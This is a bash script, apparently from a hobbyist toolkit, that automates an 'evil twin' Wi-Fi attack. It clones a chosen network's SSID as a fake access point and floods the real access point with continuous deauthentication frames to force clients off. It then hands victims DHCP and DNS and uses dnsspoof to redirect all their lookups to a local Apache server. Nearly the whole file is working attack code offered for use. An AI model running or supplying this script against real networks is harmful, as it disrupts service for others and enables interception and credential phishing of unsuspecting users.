#!/bin/bash

# First plug Alfa adapter and than tp-link adapter (important!)
# wlan0 = Alfa adapter - used for creating Fake AP
# wlan1 = tp-link adapter - used for deauthenticate Original AP

echo "Cleaning up..."
sleep 1
pkill screen
pkill dnsmasq
pkill hostapd
killall dnsmasq dhcpd isc-dhcp-server network-manager wpa_supplicant
ifconfig wlan0mon down
ifconfig wlan1 down
rm -f /root/Documents/EvilTwinAttack/hostapd.conf
airmon-ng check kill
/etc/init.d/apache2 start
sudo service apache2 restart
sudo a2enmod rewrite
sudo service apache2 reload


# Setting-up Alfa adapter
ifconfig wlan0 up
airmon-ng start wlan0
ifconfig wlan0mon up

# Listing all Wifi networks around
airodump-ng wlan0mon

# Configuring fake AP
echo -e "Configuring fake AP..."
echo -e ""
# ssid is the name of the Original AP you want to fake
read -p $'\e[1;34m>>> Enter SSID: \e[0m' ssid
# mac address will be used later for deauthentication
read -p $'\e[1;34m>>> Enter MAC Address: \e[0m' mac 
# channel of the Original AP
read -p $'\e[1;34m>>> Enter Channel: \e[0m' channel
cat > /root/Documents/EvilTwinAttack/hostapd.conf << EOF
ssid=$ssid
channel=$channel
interface=wlan0mon
driver=nl80211
hw_mode=g
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
EOF

# Setting up TP-link adapter
iwconfig wlan1 mode monitor # needs in tp-link only
ifconfig wlan1 up
airmon-ng start wlan1 
iwconfig wlan1 channel $channel # channel necessary for the deauth
ifconfig wlan1 up

# Create Fake AP
screen -dmS ap bash -c "hostapd /root/Documents/EvilTwinAttack/hostapd.conf"
echo -e "(hostapd started view at 'sudo screen -r ap')"
echo -e ""
echo -e "Waiting for Fake AP to be created..."
sleep 5
ifconfig wlan0mon 10.0.0.1 netmask 255.255.255.0

# Setting up iptables
iptables --flush
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
iptables --append FORWARD --in-interface wlan0mon -j ACCEPT 
iptables -t nat -A POSTROUTING -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

# Run DNS/DHCP server
echo -e "Starting dnsmasq DHCP/DNS..."
screen -dmS dns bash -c "dnsmasq -C  /root/Documents/EvilTwinAttack/dnsmasq.conf -d"
echo -e "(dnsmasq started view at 'sudo screen -r dns')"
echo -e ""
sleep 2


# Run DNSSpoof
# redirect every DNS query from victim to our Apache web server
echo -e "Starting DNSSpoof..."
screen -dmS spoof bash -c "sudo dnsspoof -i wlan0mon"
echo -e "(dnsspoof started view at 'sudo screen -r spoof')"
echo -e ""
sleep 2


# Deauthenticate users from original AP - tp-link adapter is responsible for that
screen -dmS dn bash -c "aireplay-ng --deauth 0 -a $mac wlan1"
echo -e "(aireplay-ng (deauth) started view at 'sudo screen -r deauth')"
echo -e ""
echo -e "Waiting for victim to disconnect forcefully..."
sleep 20

# Click for stop the ATTACK
echo -e ""
echo -e '\e[1;31mxX ATTACK ACTIVE Xx \e[0m'
read -p $'\e[1;31mTo end attack press "Enter"...\e[0m'


echo "Cleaning up..."
sleep 1
pkill screen
pkill dnsmasq
pkill hostapd
killall dnsmasq dhcpd isc-dhcp-server network-manager wpa_supplicant
airmon-ng check kill
ifconfig wlan0mon down
ifconfig wlan1 down
rm -f /root/Documents/EvilTwinAttack/hostapd.conf












